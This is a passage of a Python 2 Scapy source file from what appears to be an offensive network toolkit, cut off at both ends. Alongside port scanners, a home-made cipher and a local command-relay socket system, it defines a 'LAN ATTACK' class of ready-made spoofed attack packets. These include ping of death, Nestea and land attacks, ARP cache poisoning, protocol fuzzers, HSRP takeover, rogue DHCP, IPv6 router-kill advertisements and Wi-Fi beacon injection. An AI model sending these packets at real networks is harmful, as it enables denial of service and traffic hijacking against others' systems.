	ans = None
	unans = None
	srcPort = random.randint(1025,65534)
	build = Ether(dst=mac)/IP(dst=ip)
	if mode == 'fast': ans,unans =srp(build/TCP(dport=dp, sport=srcPort,\
							flags = "A"),timeout=1)
	elif mode == None : ans,unans = srp(build/TCP(dport=(1,1024), flags="A"),timeout=1)
	for s,r in ans:
		ports.append(r.sport)
		if config.noise == 'talk':print 'port opened on '+ ip +" port: "+ str(r.sport) + " flag: " + str(r.flags)
	ports = unique1d(ports)
	return ports

#SCAN TCP FireWall
def scscantcp_fw(ip,mac,mode=None):
	if config.noise == 'talk': print "tcp scan fw(1, 1023)"
	ports=[]
	dp = [20,21,22,23,53,80,137,138,139,443,449,548,1023,3306,8080]
	ans = None
	unans = None
	srcPort = random.randint(1025,65534)
	build = Ether(dst=mac)/IP(dst=ip)
	if mode == 'fast': ans,unans = srp(build/TCP(dport=dp,sport=srcPort,flags="S",options=[('Timestamp',(0,0))]),timeout=1)
	elif mode == None : ans,unans = srp(build/TCP(dport=(1,1024),sport=srcPort,flags="S",options=[('Timestamp',(0,0))]),timeout=1)
	for s,r in ans:
		ports.append(r.sport)
		if config.noise == 'talk': print 'port opened on '+ ip +" port: "+ str(r.sport) + " flag: " + str(r.flags)
	ports = unique1d(ports)
	return ports

#sr1(IP(dst="72.14.207.99")/TCP(dport=80,flags="S",options=[('Timestamp',(0,0))]))

########################[ THREADS ]#########################

def Thread(func=None,param=None):
	t = None
	if param != []: t = threading.Thread(target=func,args=(param,))
	else: t = threading.Thread(target=func)
	return t

def Thread_p(counts, packet):
	pkt = import_packet(packet)
	if config.noise != 'silent': print("sending " + str(counts) + " packets of \n" + pkt.summary())
	sendp(pkt, count=counts)

def client(msg=None):
	sock = None
	#connect to the server
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(2)
	socket_list = []
	host = config.localhost
	port = config.port
	message = msg
	try : 
		sock.connect((host, port))
	except :
		print 'Unable to connect'
		return None
	socket_list.append(sock)
	sock.send(sc.encrypt('{i}'+message))
	data = ""
	while data!='quit':
		# Get the list sockets which are readable
		data = ""
		ready_to_read,ready_to_write,in_error = select.select(socket_list , [], [])
		for sockets in ready_to_read:             
			if sockets == sock:
				# incoming message from remote server, s
				data = sc.decrypt(sockets.recv(4096))
				if not data : return
				else: sock.send(sc.encrypt("quit"))
	
########################[ FUNCTIONS ]#########################

class communicate():
	def __init__(self, access = config.cyborg["comaccess"], line='line',ctype = config.cyborg["comtype"]):
		self.com = ctype
		self.access = access + '.core.bota'
		self.line = line
	def listen(self):
		command = None
		com = self.com
		line = self.line
		access = self.access
		if com == "file" and os.path.isfile(access):
			if line == 'line':
				with open(access,'rw') as f: command = f.readline()
			elif line == 'multiline':
				command = []
				f = open(access, 'rw')
				flines = f.readlines()
				f.close()
				for fline in flines: command.append(fline)
			if command != [] and command != [""] and command != "" and command != None: os.remove(access)
		return command



#COMMUNICATION BETWEEN CYBORG AND PROCESSORS
class comFileManager():
	def __init__(self, kind="file"):
		self.kind = kind
	def append(self, name, cmd, param=None,param2=None):
		if self.kind == "file":
			fpath = None
			mode = 'r'
			fpath = name+'.core.bota'
			if os.path.isfile(fpath): mode = 'a'
			else: mode = 'w'
			with open(fpath, mode) as f: 
				if param != [] and param != None:
					if param2 != [] and param2 != None:
						if isinstance(param2, list):
							for i in range(len(param)): f.write(cmd+' '+param[i]+' '+param2[i]+'\n')
						else: f.write(cmd+' '+param+' '+param2+'\n')
					else:
						if isinstance(param, list):
							for c in param: f.write(cmd+' '+c+'\n')
						else: f.write(cmd+' '+param+'\n')
				else: f.write(cmd+'\n')
		elif self.kind == "tunel":
			global config
			if param != [] and param != None:
				if param2 != [] and param2 != None:
					if isinstance(param2, list):
						for i in range(len(param)): config.insert_msg(name, cmd+param[i]+' '+param2[i]+'\n')
					else: config.insert_msg(name, cmd+' '+param+' '+param2+'\n')
				else:
					if isinstance(param, list):
						for c in param: config.insert_msg(name, cmd+' '+c+'\n')
					else: config.insert_msg(name, cmd+' '+param+'\n')
			else: config.insert_msg(name, cmd+'\n')

def parse_params(cmd):
	cmd = cmd.replace('\n',' ')
	cmd = cmd.replace('=', ' ')
	if cmd.find('\'') !=-1 and countoccu(cmd,'\'') == 2:
		indx = findindx(cmd,'\'')
		indx2 = findindx(cmd, '\'',2)
		cmd1 = cmd[:indx+2]
		cmd2 = cmd[indx:indx2+3]
		cmd2 = cmd2.replace('\'', '')
		cmd2 = cmd2.replace(" ", '')
		cmd = cmd1 + " " + cmd2
	if cmd.find('\"') != -1 and countoccu(cmd,'\"') == 2:
		indx = findindx(cmd,'\"')
		indx2 = findindx(cmd, '\"',2)
		cmd1 = cmd[:indx+2]
		cmd2 = cmd[indx:indx2+3]
		cmd2 = cmd2.replace('\"', '')
		cmd2 = cmd2.replace(" ", '')
		cmd = cmd1 + " " + cmd2
	param = cmd.split(' ')
	param = [p for p in param if p != '']
	if param != []:
		#for interpreting .
		tosplit = True
		if cmd.find('.') != -1:
			for p in param:
				if p.find('.') != -1:
					for t in p.split('.'):
						if t != '':
							if t[0] == '-' or t.isdigit():
								tosplit = False
								param[param.index(p)] = [p]
								break
					if tosplit == True:
						param[param.index(p)] = p.split('.')
					else: tosplit = True
				else: param[param.index(p)] = [p]
		else: param = [[p] for p in param]
		param = reduce(list.__add__, param, [])
	else: param = [[]]
	cmd = param[0]
	if isinstance(param, list): param = param[1:]
	return (cmd, param)

def wait_for_file(name, sleep=0.01):
	fname = 'e' + name + '.bota'
	if not os.path.isfile(fname): return False
	else:
		os.remove(fname) 
		return True
	

def write_command(cmds):
	fname = 'list.bota'
	mode = 'w'
	if os.path.isfile(fname):
		mode = 'a'
	f = open(fname, mode)
	i=0
	for cmd in cmds:
		f.write(cmd)
		i=i+1
		if i<len(cmd):
			f.write('\n')
	f.close()

def cyborgReadList():
	if config['comtype'] == 'file':
		f = open(config['comaccess'],'w')
		f.write('readlist')
		f.close()

def writeToCyborg(msg):
	with open(config.cyborg["comaccess"]+'.core.bota','w') as comac: 
		comac.write(msg)

def unique1d(seq):
	seen = set()
	seen_add = seen.add
	return [ x for x in seq if not (x in seen or seen_add(x))]

def in2d(term,arr2d,no=0):
	for i in range(0, len(arr2d)):
		if arr2d[i][no] == term or term == config.netspecs.get_lan_ip():
			return True
	return False


def hasdigit(arr):
	for a in arr:
		if a.isdigit(): return True
	return False

def countoccu(strg,char):
	i = -1
	while strg.find(char)!=-1:
		i += 1
		if i == 0: i = 1
		strg = strg[strg.find(char)+len(char):]
	return i

def findindx(strg, char, indx=1, opt=0):
	i = 0
	pos = -1
	found = strg
	ret = 0
	if opt == 2:
		indx = countoccu(strg,char)-indx
	while i < indx and found != '' and found.find(char) != -1:
		i+=1
		ret = len(char)
		tocut = len(char)+found.find(char)
		if opt in (0,2):
			pos += found.find(char)+ret
		elif opt==1:
			pos += tocut
		found = found[tocut:]
	if opt == 2:
		pos = len(strg)-pos
	return pos - 2

	
def extract(strg,chars,pipe=''):
	if isinstance(chars,list):
		for c in chars:
			if strg.find(c) != -1:
				start = strg[0:strg.find(c)]
				end = strg[strg.find(c)+len(c):]
				strg = start + end
	else:
		if strg.find(chars) != -1:
			start = strg[0:strg.find(chars)]
			end = strg[strg.find(chars)+len(chars):]
			strg = start + end
	if pipe != '':
		lst = strg.split(pipe)
		lst = [m for m in lst if m != '']
		strg = '|'.join(lst)
	return strg


def findchar(strg,char):
	for i in range(len(strg)):
		if strg[i] == char: return True
	return False

def findchar2d(strg,arr):
	if isinstance(arr, list):
		for ar in arr:
			if strg in ar: return True
	return False

def find2dindex(strg,arr):
	i=0
	for ip in arr:
		if IPAddress(strg) == IPAddress(ip): return i
		i+=1
	return -1

def find2dStrByChar(strg,arr):
	for ar in arr:
		if strg in ar: return ar
	return None

def surround_print(strg, char, side=1, length=-1,padding=0):
	x, y = get_terminal_size()
	if length != -1: x = length
	nbchar = x-len(strg)
	if side == 2:
		nbchar = int(round(nbchar / 2))
	nbchar -= padding
	astrg = list(strg)
	string = ''
	for i in range(nbchar):
		if side == 2:
			astrg.insert(0,char)
		astrg.append(char)
	for i in range(len(astrg)): string += astrg[i]
	return string

def center_print(strg, adjwidth=0,space=True):
	x, y = get_terminal_size()
	lwidth = int(round(x/2+len(strg)/2+adjwidth)) if x-len(strg) > 0 else 0
	mat = '{0: >'+str(lwidth)+'}'
	center = mat.format(strg)
	if space == True: center = '\n'+center+'\n'
	print center

def pretty_print(lst,no=False):
	if lst != []:
		x, y = get_terminal_size()
		colorw = 7
		width = len(lst[0])+10
		if '\033' in lst[0]: width -= 7
		colwidth = 0
		form = ''
		final = False
		add = 0
		w = 0
		color = colours.default
		for i in range(0,len(lst)):
			rng = len(str(i))
			w1 = ((width+len(str(i))+2))
			if i+1 > len(lst)-1: w2 = 0 
			else: 
				w2 = len(lst[i+1])+len(str(i))+2
				if "\033" in lst[i+1]: w2-=3
			futw = colwidth+w1+w2
			if "\033" in lst[i]: 
				color = lst[i][0:5]
				futw -= 3
			s = color + str(i)+')' + colours.default
			color = colours.default
			if no : print(s),
			if (i+1) == len(lst) or futw >= x:
				if futw >= x:
					colwidth = 0
					final = True
				add = len(lst[i])
				form = lst[i]
				print(form)
			else: 
				#print str(futw),
				if '\033' in lst[i]: w = 9
				mat = '{0: <'+str(width - rng + w )+'}'
				w = 0
				add = width
				form = mat.format(lst[i])
				print(form),
			if final == False:
				colwidth += add
				if no: colwidth += len(str(i))+2
			else: final = False

def findindex(search,arr2d,col=0):
	index=-1
	for i in range(len(arr2d)):
		if arr2d[i][col] == search: return i
	return index

def sortIPs(lstipmac):
	ips = []
	ipmacs = lstipmac
	[ips.append(ipmac[0]) for ipmac in lstipmac]
	for i in range(len(ips)):
		ips[i] = struct.unpack("!I", socket.inet_aton(ips[i]))[0]
		ipmacs[i][0] = ips[i]
	ipmacs.sort(key=lambda x: x[0])
	for i in range(len(ipmacs)):
	    	ipmacs[i][0] = socket.inet_ntoa(struct.pack("!I", ipmacs[i][0]))
	return ipmacs

#IMPORT EXPORT PACKET BY STRING
def export_packet(obj):
	try: b64 = gzip.zlib.compress(cPickle.dumps(obj,2),9).encode("base64")
	except Exception,e: 
		print str(e)
		pass 
	return b64

def import_packet(obj): return cPickle.loads(gzip.zlib.decompress(obj.strip().decode("base64")))

class convert():
	@staticmethod
	def str2mac(s): 
		s = s.split(':')
		return ("%02x:"*6)[:-1] % tuple(map(lambda s: int(s,16), s))
	@staticmethod
	def hex2word(hexvalue,readable=True):
		'''Convert hex string n to hex value to an ascii word.'''
		# pad hexvalue with leading space characters
		output = []
		for i in range(0,len(hexvalue),2):
			# strip leading space characters
			s = hexvalue[i:i+2].lstrip()
			if s:
				val = int(s,16)
				if readable == True and  val > 31 and val < 126:
					output.append(s.decode("hex"))
				else: output.append(s.decode("hex"))
		return "".join(output)
	@staticmethod
	def ip2int(ip):
		sip = ip.split(".")
		sip.reverse()
		num = 0
		for i in range(len(sip)):
			num += (256 ** i) * int(sip[i])
		return num
	@staticmethod
	def int2ip(i):
		ip = []
		rest = i
		for x in range(3, -1, -1):
			num = math.floor(rest / 256 ** x)
			rest = rest - ((256 ** x) * num)
			ip.append(str(int(num)))
		return ".".join(ip)


class colours:
	none = ""
	default = "\033[0m"
	bold = "\033[1m"
	underline = "\033[4m"
	blink = "\033[5m"
	reverse = "\033[7m"
	concealed = "\033[8m"

	black = "\033[30m"
	red = "\033[31m"
	green = "\033[32m"
	supgreen = '\033[92m'
	yellow = "\033[33m"
	blue = "\033[34m"
	magenta = "\033[35m"
	cyan = "\033[36m"
	white = "\033[37m"
	lightpurple = '\033[94m'
	purple = '\033[95m'
	orange='\033[33m'
	lightgrey='\033[37m'
	darkgrey='\033[90m'
	lightred='\033[91m'
	lightgreen='\033[92m'
	lightblue='\033[94m'
	lightcyan='\033[96m'

	on_black = "\033[40m"
	on_red = "\033[41m"
	on_green = "\033[42m"
	on_yellow = "\033[43m"
	on_blue = "\033[44m"
	on_magenta = "\033[45m"
	on_cyan = "\033[46m"
	on_white = "\033[47m"

	beep = "\007"

	# non-standard attributes supported by some terminals
	dark = "\033[2m"
	italic = "\033[3m"
	rapidblink = "\033[6m"
	strikethrough= "\033[9m"

def call_func(myString): 
	sys = system_call(myString)
	sys.start()

class system_call(threading.Thread):
	def __init__(self,myString):
		threading.Thread.__init__(self)
		self.mystr = myString
	def run(self):
		os.system(self.mystr)

def netstart_thread(nb_try=3):
	problem = False
	i = 0
	status = False
	while i < nb_try and status == False:
		try:
			problem = False
			config.netspecs.start()
			status = config.netspecs.get_status()
		except Exception, e:
			problem = True
			if config.noise != 'silent': 
				print(colours.red+"problem with your network"+colours.default+"\nretrying to get specs")
				print(str(e))
		i+=1
		if i > 0 and problem == True:
			print(colours.on_red+"Try number "+str(i)+colours.default) 
			print(colours.on_red+"config.netspecs loaded at "+str(config.netspecs.get_loading_state())+"%"+colours.default)
			time.sleep(1)
		if i == nb_try:
			print('\n'+colours.red+"Your are currently offline"+colours.default+'\n')
			print("type: \'c)netspec\' to restart trying to connect\n")
	

def netstart(xcall=False):
	if xcall==True:
		t = threading.Thread(target=netstart_thread,args=(5,))
		t.start()
		t.join()

################################################################################################################################
###############################################[ TERMINAL SIZE ]################################################################
################################################################################################################################
def get_terminal_size():
    """ getTerminalSize()
     - get width and height of console
     - works on linux,os x,windows,cygwin(windows)
     originally retrieved from:
     http://stackoverflow.com/questions/566746/how-to-get-console-window-width-in-python
    ---EXAMPLE---
    sizex, sizey = get_terminal_size()
    print  'width =', sizex, 'height =', sizey
    """
    current_os = platform.system()
    tuple_xy = None
    if current_os == 'Windows':
        tuple_xy = _get_terminal_size_windows()
        if tuple_xy is None:
            tuple_xy = _get_terminal_size_tput()
            # needed for window's python in cygwin's xterm!
    if current_os in ('Linux', 'Darwin') or current_os.startswith('CYGWIN'):
        tuple_xy = _get_terminal_size_linux()
    if tuple_xy is None:
        print "default"
        tuple_xy = (80, 25)      # default value
    return tuple_xy
 
 
def _get_terminal_size_windows():
    try:
        from ctypes import windll, create_string_buffer
        # stdin handle is -10
        # stdout handle is -11
        # stderr handle is -12
        h = windll.kernel32.GetStdHandle(-12)
        csbi = create_string_buffer(22)
        res = windll.kernel32.GetConsoleScreenBufferInfo(h, csbi)
        if res:
            (bufx, bufy, curx, cury, wattr,
             left, top, right, bottom,
             maxx, maxy) = struct.unpack("hhhhHhhhhhh", csbi.raw)
            sizex = right - left + 1
            sizey = bottom - top + 1
            return sizex, sizey
    except:
        pass
 

def _get_terminal_size_tput():
    # get terminal width
    # src: http://stackoverflow.com/questions/263890/how-do-i-find-the-width-height-of-a-terminal-window
    try:
        cols = int(subprocess.check_call(shlex.split('tput cols')))
        rows = int(subprocess.check_call(shlex.split('tput lines')))
        return (cols, rows)
    except:
        pass
 
 
def _get_terminal_size_linux():
    def ioctl_GWINSZ(fd):
        try:
            import fcntl
            import termios
            cr = struct.unpack('hh', fcntl.ioctl(fd, termios.TIOCGWINSZ, '1234'))
            return cr
        except:
            pass
    cr = ioctl_GWINSZ(0) or ioctl_GWINSZ(1) or ioctl_GWINSZ(2)
    if not cr:
        try:
            fd = os.open(os.ctermid(), os.O_RDONLY)
            cr = ioctl_GWINSZ(fd)
            os.close(fd)
        except:
            pass
    if not cr:
        try:
            cr = (os.environ['LINES'], os.environ['COLUMNS'])
        except:
            return None
    return int(cr[1]), int(cr[0])



def randmac():
	random.seed()
	return ':'.join(map(lambda x: "%02x" % x, [ 0x00, 0x16, 0x3e,random.randint(0x00, 0x7f),random.randint(0x00, 0xff),random.randint(0x00, 0xff) ]))

def randip():
	random.seed() 
	return '.'.join(map(lambda x: "%s" % x, [str(random.randint(0,255)), str(random.randint(0,255)), str(random.randint(0,255)), str(random.randint(0,255))]))

class rRandMAC(RandString):
    def __init__(self, template="*"):
        template += ":*:*:*:*:*"
        template = template.split(":")
        self.mac = ()
        for i in range(6):
            if template[i] == "*":
                v = RandByte()
            elif "-" in template[i]:
                x,y = template[i].split("-")
                v = RandNum(int(x,16), int(y,16))
            else:
                v = int(template[i],16)
            self.mac += (v,)
    def _fix(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % self.mac

class scrypt():
	def __init__(self):
		self.dict = cdict()
		self.dict._swap()
		self.shifted = random.randint(-7,7)
	def encrypt(self, strg):
		crypt_dict = self.dict._swapstr(strg)
		crypt_shex = self.shift_bytes(crypt_dict, self.shifted)
		crypt_b64 = crypt_shex.encode("base64")
		crypt_zlib = zlib.compress(crypt_b64, zlib.Z_BEST_COMPRESSION)
		return crypt_zlib
	def decrypt(self, strg):
		decrypt_zlib = zlib.decompress(strg)
		decrypt_b64 = decrypt_zlib.decode("base64")
		decrypt_shex = self.shift_bytes(decrypt_b64, -self.shifted)
		decrypt_dict = self.dict._unswapstr(decrypt_shex)
		return decrypt_dict
	def shift_bytes(self, strg, pos=-2):
		ahex = strg.encode("hex")
		abyte = bytearray.fromhex(ahex)
		shex = ''
		for b in abyte:
			bn = bin(b)
			bn = bn
			abin = [p for p in bn[2:]]
			for p in range(8 - len(abin)):
				abin.insert(0, '0')
			switch = 2
			for i in range(len(abin)):
				if abin[i] == '0': abin[i] = '1'
				elif abin[i] == '1': abin[i] = '0'
			abintmp = list(abin)
			for i in range(len(abin)):
				indx = i-(pos) if i-(pos) < 8 else (i-(pos))-8
				abin[i] = abintmp[indx]
			shex +=  chr(int(hex(int(''.join(abin),2)).split('x')[1], 16))
		return shex

class cdict():
		def __init__(self):
			self._dict = {}
			self._dictswap = {}
			self._build()
		def _build(self):
			#ascii readable char
			for i in range(32,126):
				self._dict[chr(i)] = i
		def _getkey(self, val):
			for k, v in self._dict.iteritems():
	   			if v == val: 
					return k
			return -1
		def _getswapkey(self, val):
			for k, v in self._dictswap.iteritems():
	   			if v == val: 
					return k
			return "0"
		def _getval(self, key): return self._dict[key]
		def _getswapval(self, key):	return self._dictswap[key]
		def _getkeypos(self, pos):
			i = 0
			for k, v in self._dict.iteritems():
	   			if i == pos: 
					return k
				i+=1
			return "0"
		def _getvalpos(self, pos):
			i = 0
			for k, v in self._dict.iteritems():
	   			if i == pos: 
					return v
				i+=1
			return "0"
		def _getswapkey(self, val):
			for k, v in self._dictswap.iteritems():
	   			if v == val: 
					return k
			return "0"
		def _swapstr(self, strg):
			str2 = ''
			for c in strg:
				str2 += chr(self._dictswap[c])
			return str2
		def _unswapstr(self, strg):
			str2 = ''
			strg = str(strg)
			for c in strg:
				str2 += self._getswapkey(ord(c))
			return str2
		def _swap(self):
			self._dictswap = {}
			aval = []
			i = 0
			for i in range(0, 256):
	   			aval.append(i)
				i += 1
			maxval = 256
			for i in range(len(self._dict)):
				random.seed(time.time())
				rnd = random.randint(0, (maxval-1))
				val = aval[rnd]
				key = self._getkeypos(i)
				self._dictswap[key] = val 
				aval.pop(rnd)
				maxval-=1
		def _tostr(self):
			for k, v in self._dict.iteritems():
				print k, str(v)

################################################################################################################################
###############################################[ TUNEL ]########################################################################
################################################################################################################################
class Server():
	def __init__(self,port,icrypt=None):
		self.host = socket.gethostbyname(socket.gethostname()) 
		self.socket_list = []
		self.recv_buffer = 250000
		self.port = port
		self.server_socket = None
		self.icrypt = icrypt
		self.names = []
		self.msg = []
		self.connect()
	def connect(self):
		self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.server_socket.bind((self.host, self.port))
		self.server_socket.listen(10)
		self.socket_list.append(self.server_socket)
		self.names.append('server')
		self.msg.append('c')
	def stop(self):
		for i in range(len(self.msg)):
			self.msg[i] = 'q'
		self.server_socket.close()
		self.socket_list = []
		self.names = []
	def get_port(self): return self.port
	def get_icrypt(self): return self.icrypt
	def run(self):
		data = ""
		try:
			ready_to_read,ready_to_write,in_error = select.select(self.socket_list,[],[],0)
			for sock in ready_to_read:
				skt = self.socket_list[self.socket_list.index(sock)]
				# a new connection request recieved
				if sock == self.server_socket:
					sockfd, addr = self.server_socket.accept()
					self.socket_list.append(sockfd)
					self.msg.append('c')
				# a message from a client, not a new connection
				else:
					# process data recieved from client, 
					try:
						data = ""
						if self.icrypt != None: data = self.icrypt.decrypt(sock.recv(self.recv_buffer))
						else: data = sock.recv(self.recv_buffer)
						if not data:
							try: 
								self.socket_list.remove(sock)
								self.names.pop(self.socket_list.index(sock))
								sock.close()
							except: pass
						else:
							indx = self.socket_list.index(sock)
							if data == 'c': 
								if self.icrypt != None: self.icrypt.encrypt(self.msg[indx])
								else:
									skt.send(self.msg[indx])
								self.msg[indx] = 'c'
							elif data[0:2] == '!q':
								name = self.names[indx]
								self.names.pop(indx)
								self.msg.pop(indx)						
								self.socket_list.pop(indx)
								sock.close()
								if len(data)>2:
									return data[2:]
							elif data[:3] == '[n]': 
								self.names.append(data[3:])
								self.msg.append('c')
							else: 
								if self.icrypt != None: skt.send(self.icrypt.encrypt(self.msg[indx]))
								else: skt.send(self.msg[indx])
								self.msg[indx] = 'c'
								return data
					except Exception, e: return str(e)
			return None
		except: 
			pass
			return None
	def sendto(self,name, msg):
		if name in self.names:
			self.msg[self.names.index(name)] = msg
	def broadcast (self, message):
		if config.noise != 'silent': print("Sending to server",message)
		for socket in self.socket_list:
			# send the message only to peer
			if socket != self.server_socket:
				try :
					if self.icrypt != None: socket.send(self.icrypt.encrypt(message))
					else: socket.send(message)
				except :
					# broken socket, remove it
					if socket in self.socket_list:
						indx = self.socket_list.index(socket)
						self.names.pop(indx)
						self.msg.pop(indx)
						self.socket_list.remove(socket)
						socket.close()

class Client():
	def __init__(self,port,icrypt,cname):
		self.socket_list = []
		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.sock.settimeout(2)
		self.host = socket.gethostbyname(socket.gethostname()) 
		self.port = port
		self.cname = cname
		self.icrypt = icrypt
	def connect(self):
		try : self.sock.connect((self.host, self.port))
		except :
			print 'Unable to connect'
			return None
		self.socket_list.append(self.sock)
		if self.icrypt != None: self.sock.send(self.icrypt.encrypt("[n]"+self.cname))
		else: 
			self.sock.send("[n]"+self.cname)
	def stop(self):
		if self.icrypt != None: self.sock.send(self.icrypt.encrypt('q'))
		else: self.sock.send('q')
	def run(self):
		data = ''
		try:
			self.sock.send('c')
			ready_to_read,ready_to_write,in_error = select.select(self.socket_list , [], [])
			for sock in ready_to_read:
				if sock == self.sock:
					# incoming message from remote server, s
					if self.icrypt != None: data = sc.decrypt(sock.recv(150000))
					else: data = sock.recv(150000)
					if not data : return None
					elif data == 'q': self.sock.send('q')
					return data
		except:
			pass
			return "stop"
	def send(self,msg):
		if self.icrypt != None: self.sock.send(self.icrypt.encrypt(msg))
		else: self.sock.send(msg)

class Tunel():
	def __init__(self, icrypt=None):
		self.icrypt = icrypt
		self.tunels = {}
	def create(self,name,icrypt=None):
		port = self.port_finder()+1
		ser = Server(port,icrypt)
		self.tunels[name] = {'server': ser, 'icrypt': icrypt}
	def get_client(self,name, cname): 
		cli = Client(self.tunels[name]['server'].get_port(), self.tunels[name]['server'].get_icrypt(),cname)
		return cli
	def get_server(self,name): return self.tunels[name]['server']
	def port_finder(self):
		portno = random.randint(6600, 66000)
		sock = None
		while sock == None:
			try:
				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				sock.bind((socket.gethostbyname(socket.gethostname()), portno))
				sock.listen(10)
				sock.close()
				return portno
			except:
				sock = None
				portno += 1
				pass
################################################################################################################################
###############################################[ PACKETS ]######################################################################
################################################################################################################################

####################################### [ LAN ATTACK ]#########################################################

class packet_machine():
	def __init__(self):
		self.ether = Ether(src=SPOOFMAC)
		self.packets = []
		self.event = None
		self.thread = None
	def c1mp(self,ip,mac): return Ether(src=SPOOFMAC,dst=mac)/IP(src=SPOOFIP,dst=ip, ihl=2, version=3)/ICMP()
	def c1pingofdeath(self,ip,mac): return fragment(Ether(src=SPOOFMAC,dst=mac)/IP(dst=ip,src=SPOOFIP)/ICMP()/("X"*60000))
	def c1nesteaattack(self,ip,mac):
		return [Ether(src=SPOOFMAC,dst=mac)/IP(src=SPOOFIP,dst=ip, id=42, flags="MF")/UDP()/("X"*10),
			    Ether(src=SPOOFMAC,dst=mac)/IP(src=SPOOFIP,dst=ip, id=42, frag=48)/("X"*116),
				Ether(src=SPOOFMAC,dst=mac)/IP(src=SPOOFIP,dst=ip, id=42, flags="MF")/UDP()/("X"*224)]
	def c1landattack(self,ip,mac): return Ether(src=SPOOFMAC,dst=mac)/IP(src=ip,dst=ip)/TCP(sport=135,dport=135)
	def c1ipattack(self,ip,mac): return Ether(src=SPOOFMAC,dst=mac)/IP(src=SPOOFIP, dst=ip,proto=(0,255))/"BottenHannah"
	def poison(self,ip): print 'poison on', ip
	def arpcachepoison(self,ip, mac, gateway): return Ether(src=SPOOFMAC,dst=mac)/ARP(op="who-has", psrc=gateway, pdst=ip)
	def fuzzNTP(self,ip): return IP(src=SPOOFIP, dst=ip)/fuzz(UDP()/NTP(version=4))
	def fuzzTCP(self,ip): return [IP(src=SPOOFIP, dst=ip)/TCP(dport=23, options=[(x, "")])/"bye bye" for x in range(255)]
	def fuzz_mac(self): 
		mac1 = RandMAC("*:*:*:*:*:*")
		mac2 = RandMAC("*:*:*:*:*:*")
		ip = RandIP("*.*.*.*")
		return Ether(src=mac1, dst=mac2) / IP(src=ip, dst=ip) / ICMP()
	def fuzz_tftq(self,ip): return IP(src=SPOOFIP,dst=ip)/UDP(sport=1337,dport=69)/TFTP()/fuzz(TFTP_RRQ(mode='octet'))
	def fuzz_dns(self,ip): return IP(src=SPOOFIP, dst=ip)/UDP(dport=53)/fuzz(DNS(qd=fuzz(DNSQR()),an=fuzz(DNSRR())))
	def fuzz_hsrp(self,ip): return IP(src=SPOOFIP, dst=ip)/UDP()/HSRP(group=1, priority=255, virtualIP=ip)
	def mp1(self,ip): return IP(src=SPOOFIP, dst=ip, ihl=2, options="erb$x\'{}Q_Wl;;z;\'0\"2$", version=3)/ICMP()
	def dnsQuery(self,ip):return IP(dst=ip)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.slashdot.org"))
	def mp2(self,ip): return IP(src=SPOOFIP, dst=ip, ihl=2, options="BottenHannah", version=3)/ICMP()
	def frameinject(self,):
		pkt = Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2="12:a6:34:12:32:33",addr3="c5:d3:35:21:23:34")/\
		Dot11Beacon(cap="ESS")/\
		Dot11Elt(ID="SSID",info=RandString(RandNum(1,50)))/\
		Dot11Elt(ID="Rates",info='\x82\x84\x0b\x16')/\
		Dot11Elt(ID="DSset",info="\x03")/\
		Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
		return pkt
	def rogueinject(self):
		return Ether(src=SPOOFMAC,dst="ff:ff:ff:ff:ff:ff")/IP(src=SPOOFIP,dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
	def rouguetest(self):
		pkt=Ether(src=SPOOFMAC,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type", "request")])
	def ipv6_router_sol(self):
		base=IPv6(dst='fe80::1234')
		router_solicitation=ICMPv6ND_RS()
		src_ll_addr=ICMPv6NDOptSrcLLAddr(lladdr='01:23:45:67:89:ab')
		packet=base/router_solicitation/src_ll_addr
		return packet

	def ipv6_multi_cast(self): return IPv6(dst='fe80::1234')/ICMPv6MRD_Advertisement(advinter=40)

	def ipv6_icmp(self): 
		return [IPv6(dst="dead:dead:dead::1")/ICMPv6EchoRequest(),IPv6(src="fd11::1",dst="2a03:2880:2110:df07:face:b00c:0:1")/ICMPv6EchoRequest()]

	def ipv6_routerkill(self): return IPv6(dst=RandIP6("dead::1"),src=RandIP6("dead::1"))/ICMPv6ND_RA(routerlifetime=0)

	def ipv6_nav1(self):
		return IPv6()/ICMPv6ND_RA()/ ICMPv6NDOptPrefixInfo(prefix="2001:db8:cafe:deca::", prefixlen=64)/ ICMPv6NDOptSrcLLAddr(lladdr="00:b0:de:ad:be:ef")

	def ipv6_nav2(self):
		a=IPv6(nh=58, src='fe80::214:f2ff:fe07:af0', dst='ff02::1', version=6L, hlim=255, plen=64, fl=0L, tc=224L)
		b=ICMPv6ND_RA(code=0, chlim=64, H=0L, M=0L, O=0L, routerlifetime=1800, P=0L, retranstimer=0, prf=0L, res=0L, reachabletime=0, type=134)
		c=ICMPv6NDOptSrcLLAddr(type=1, len=1, lladdr='00:14:f2:07:0a:f1')
		d=ICMPv6NDOptMTU(res=0, type=5, len=1, mtu=1500)
		e=ICMPv6NDOptPrefixInfo(A=1L, res2=0, res1=0L, L=1L, len=4, prefix='2001:db99:dead::', R=0L, validlifetime=2592000, prefixlen=64, preferredlifetime=604800, type=3)
		return a/b/c/d/e

	def ipv6_hophop(self):
		toret = []
		packet = IPv6(src='fe80::214:f2ff:fe07:af0',dst='ff02::1')
		packets = IPv6ExtHdrDestOpt()/IPv6ExtHdrRouting()/IPv6ExtHdrHopByHop()
		for x in range (0,10):
			packets = packets
			toret.append(packet/packets)
		return toret
	def ipv6_jumbo(self):
		return IPv6(dst='fe80::200:aaff:fee2:d273',src='dead::1')/IPv6ExtHdrHopByHop(options=Jumbo(jumboplen=100000))/Raw(RandString(1400))
	## SCAN PORT HANDSHAKE
	def tcp_handshake(self, ip, dp):
		ips=IP(dst=ip)
		TCP_SYN=TCP(dport=dp, flags="S", seq=100)
		TCP_SYNACK=sr1(ips/TCP_SYN,timeout=1)
		try:
